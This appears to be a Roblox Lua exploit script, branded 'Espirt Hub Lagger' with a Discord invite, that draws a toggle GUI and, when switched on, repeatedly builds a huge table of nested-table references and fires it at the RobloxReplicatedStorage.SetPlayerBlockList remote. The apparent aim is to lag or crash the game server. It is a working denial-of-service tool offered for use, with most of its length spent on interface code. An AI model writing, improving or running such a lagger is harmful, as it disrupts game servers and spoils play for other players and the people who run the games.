local p=game:GetService("Players")
local ts=game:GetService("TweenService")
local uis=game:GetService("UserInputService")

local pl=p.LocalPlayer
local pg=pl:WaitForChild("PlayerGui")

local mb=uis.TouchEnabled and not uis.MouseEnabled
local cc={ti=0.001,tr=1,wt=mb and 3 or 3}
local rp="RobloxReplicatedStorage.SetPlayerBlockList"

local function rt(x)
    if not x or x==""then return nil end 
    local o=game 
    local c=x:gsub("^game%.","")
    for s in c:gmatch("[^%.]+")do 
        if o then o=o[s]else return nil end 
    end 
    return o 
end

local function gv(v)
    local m=499999 
    if type(v)~="number"then return nil end 
    return m/(v+2)
end

local function bm(ti,tr)
    local mt={}
    local st={}
    table.insert(st,{})
    local z=st[1]
    for i=1,ti do 
        local ti2={}
        table.insert(z,ti2)
        z=ti2 
    end 
    local mx=gv(ti)or 9999999 
    for i=1,mx do 
        table.insert(mt,st)
        if i%5000==0 then task.wait()end 
    end 
    local r=rt(rp)
    if r then 
        for i=1,tr do 
            pcall(function()
                if r:IsA("RemoteEvent")or r:IsA("UnreliableRemoteEvent")then 
                    r:FireServer(mt)
                elseif r:IsA("RemoteFunction")then 
                    r:InvokeServer(mt)
                end 
            end)
        end 
    end 
end

local sg=Instance.new("ScreenGui")
sg.Name="LaggerPremium"
sg.Parent=pg 
sg.ResetOnSpawn=false 
sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling 
sg.IgnoreGuiInset=true

local fr=Instance.new("Frame")
fr.Size=UDim2.new(0,0,0,0)
fr.Position=UDim2.new(0.5,0,0.5,0)
fr.AnchorPoint=Vector2.new(0.5,0.5)
fr.BackgroundColor3=Color3.fromRGB(15,15,15) -- Fundo escuro/preto
fr.BorderSizePixel=0 
fr.BackgroundTransparency=1 
fr.ClipsDescendants=true 
fr.Parent=sg

local cr=Instance.new("UICorner")
cr.CornerRadius=UDim.new(0,10)
cr.Parent=fr

local st2=Instance.new("UIStroke")
st2.Thickness=1.2 
st2.Color=Color3.fromRGB(255,255,255) -- Borda branca
st2.Transparency=0.3 
st2.LineJoinMode=Enum.LineJoinMode.Round 
st2.Parent=fr

local gd=Instance.new("UIGradient")
gd.Color=ColorSequence.new({
    ColorSequenceKeypoint.new(0,Color3.fromRGB(20,20,20)),
    ColorSequenceKeypoint.new(1,Color3.fromRGB(10,10,10))
})
gd.Rotation=45 
gd.Parent=fr

local hd=Instance.new("Frame")
hd.Size=UDim2.new(1,0,0,32)
hd.BackgroundColor3=Color3.fromRGB(10,10,10)
hd.BorderSizePixel=0 
hd.Parent=fr

local hc=Instance.new("UICorner")
hc.CornerRadius=UDim.new(0,10)
hc.Parent=hd

local hcv=Instance.new("Frame")
hcv.Size=UDim2.new(1,0,0.5,0)
hcv.Position=UDim2.new(0,0,0.5,0)
hcv.BackgroundColor3=Color3.fromRGB(10,10,10)
hcv.BorderSizePixel=0 
hcv.Parent=hd

local tt=Instance.new("TextLabel")
tt.Size=UDim2.new(0,180,0,18)
tt.Position=UDim2.new(0,12,0.5,-9)
tt.BackgroundTransparency=1 
tt.Text="Espirt Hub Lagger" -- NOME ALTERADO
tt.TextColor3=Color3.fromRGB(255,255,255)
tt.TextSize=12 
tt.Font=Enum.Font.GothamBlack 
tt.TextXAlignment=Enum.TextXAlignment.Left 
tt.Parent=hd

local cb=Instance.new("TextButton")
cb.Size=UDim2.new(0,18,0,18)
cb.Position=UDim2.new(1,-24,0.5,-9)
cb.BackgroundColor3=Color3.fromRGB(30,30,30)
cb.BorderSizePixel=0 
cb.Text="X"
cb.TextColor3=Color3.fromRGB(200,200,200)
cb.TextSize=10 
cb.Font=Enum.Font.GothamBold 
cb.Parent=hd

local cbc=Instance.new("UICorner")
cbc.CornerRadius=UDim.new(0,4)
cbc.Parent=cb

local dl=Instance.new("Frame")
dl.Size=UDim2.new(1,-24,0,1)
dl.Position=UDim2.new(0,12,0,38)
dl.BackgroundColor3=Color3.fromRGB(255,255,255) -- Linha divisória branca
dl.BackgroundTransparency=0.5 
dl.BorderSizePixel=0 
dl.Parent=fr

local ts2=Instance.new("Frame")
ts2.Size=UDim2.new(1,-24,0,44)
ts2.Position=UDim2.new(0,12,0,48)
ts2.BackgroundTransparency=1 
ts2.Parent=fr

local tt2=Instance.new("TextLabel")
tt2.Size=UDim2.new(0,100,0,18)
tt2.Position=UDim2.new(0,0,0.5,-9)
tt2.BackgroundTransparency=1 
tt2.Text="LAGGER"
tt2.TextColor3=Color3.fromRGB(255,255,255)
tt2.TextSize=13 
tt2.Font=Enum.Font.GothamBlack 
tt2.TextXAlignment=Enum.TextXAlignment.Left 
tt2.Parent=ts2

local tb=Instance.new("TextButton")
tb.Size=UDim2.new(0,54,0,24)
tb.Position=UDim2.new(1,-54,0.5,-12)
tb.BackgroundColor3=Color3.fromRGB(20,20,20)
tb.BorderSizePixel=0 
tb.Text=""
tb.AutoButtonColor=false 
tb.Parent=ts2

local tbc=Instance.new("UICorner")
tbc.CornerRadius=UDim.new(1,0)
tbc.Parent=tb

local tbst=Instance.new("UIStroke")
tbst.Thickness=1 
tbst.Color=Color3.fromRGB(255,255,255)
tbst.Transparency=0.4 
tbst.Parent=tb

local kn=Instance.new("Frame")
kn.Size=UDim2.new(0,16,0,16)
kn.Position=UDim2.new(0,4,0.5,-8)
kn.BackgroundColor3=Color3.fromRGB(255,255,255)
kn.BorderSizePixel=0 
kn.Parent=tb

local knc=Instance.new("UICorner")
knc.CornerRadius=UDim.new(1,0)
knc.Parent=kn

local sub=Instance.new("TextLabel")
sub.Size=UDim2.new(1,-24,0,16)
sub.Position=UDim2.new(0,12,1,-20)
sub.BackgroundTransparency=1 
sub.Text="discord.gg/mUyEtgZbj2" -- DISCORD ALTERADO
sub.TextColor3=Color3.fromRGB(180,180,180) -- Texto cinza claro
sub.TextSize=9 
sub.Font=Enum.Font.Gotham 
sub.TextXAlignment=Enum.TextXAlignment.Center 
sub.Parent=fr

local on=false 
local run=false 
local th=nil

local function sl()
    if run then return end 
    run=true 
    th=task.spawn(function()
        while run do 
            task.spawn(function()bm(cc.ti,cc.tr)end)
            task.wait(cc.wt)
        end 
    end)
end

local function spl()
    run=false 
    if th then 
        task.cancel(th)
        th=nil 
    end 
end

local function tg()
    on=not on 
    kn.Position=on and UDim2.new(1,-22,0.5,-8) or UDim2.new(0,4,0.5,-8)
    
    -- Botão "Lagger" fica Branco quando ON e Cinza quando OFF
    tb.BackgroundColor3=on and Color3.fromRGB(255,255,255) or Color3.fromRGB(20,20,20)
    
    -- A bolinha do botão inverte a cor para contrastar
    kn.BackgroundColor3=on and Color3.fromRGB(0,0,0) or Color3.fromRGB(255,255,255)

    st2.Transparency=on and 0.1 or 0.3 
    st2.Color=on and Color3.fromRGB(255,255,255) or Color3.fromRGB(150,150,150)
    tbst.Color=on and Color3.fromRGB(255,255,255) or Color3.fromRGB(150,150,150)
    
    if on then sl() else spl() end 
end

tb.MouseButton1Click:Connect(tg)

tb.MouseEnter:Connect(function()
    ts:Create(tbst,TweenInfo.new(0.15),{Transparency=0.2}):Play()
end)

tb.MouseLeave:Connect(function()
    ts:Create(tbst,TweenInfo.new(0.15),{Transparency=0.4}):Play()
end)

cb.MouseEnter:Connect(function()
    -- Botão X fica Branco com texto Preto ao passar o mouse
    ts:Create(cb,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(255,255,255),TextColor3=Color3.fromRGB(0,0,0)}):Play()
end)

cb.MouseLeave:Connect(function()
    ts:Create(cb,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(30,30,30),TextColor3=Color3.fromRGB(200,200,200)}):Play()
end)

cb.MouseButton1Click:Connect(function()
    spl()
    local ct=ts:Create(fr,TweenInfo.new(0.25,Enum.EasingStyle.Back),{Size=UDim2.new(0,0,0,0)})
    ct:Play()
    ct.Completed:Connect(function()
        sg:Destroy()
    end)
end)

local drag=false 
local ds,sp

hd.InputBegan:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then 
        drag=true 
        ds=i.Position 
        sp=fr.Position 
    end 
end)

hd.InputChanged:Connect(function(i)
    if drag and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then 
        local d=i.Position-ds 
        fr.Position=UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
    end 
end)

uis.InputEnded:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then 
        drag=false 
    end 
end)

ts:Create(fr,TweenInfo.new(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{BackgroundTransparency=0,Size=UDim2.new(0,230,0,118)}):Play()
